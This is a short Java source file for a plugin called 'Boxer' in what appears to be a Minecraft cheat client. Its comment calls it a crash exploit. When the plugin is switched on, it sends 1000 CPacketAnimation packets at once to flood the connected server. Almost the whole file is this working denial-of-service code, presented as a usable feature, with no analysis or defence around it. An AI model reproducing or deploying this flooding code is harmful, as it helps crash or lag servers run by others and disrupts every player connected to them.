package me.kix.uzi.management.plugin.internal.toggleable.miscellaneous;

import me.kix.uzi.api.plugin.Category;
import me.kix.uzi.api.plugin.toggleable.ToggleablePlugin;
import net.minecraft.network.play.client.CPacketAnimation;

/**
 * The Old school crash exploit using CPacketAnimation.
 *
 * @author Jax
 * Created in Apr 2019
 */
public class Boxer extends ToggleablePlugin {

    public Boxer() {
        super("Boxer", Category.MISCELLANEOUS);
    }

    @Override
    public void onEnable() {
        super.onEnable();
        for (int i = 0; i < 1000; i++) {
            mc.getConnection().sendPacket(new CPacketAnimation());
        }
    }
}
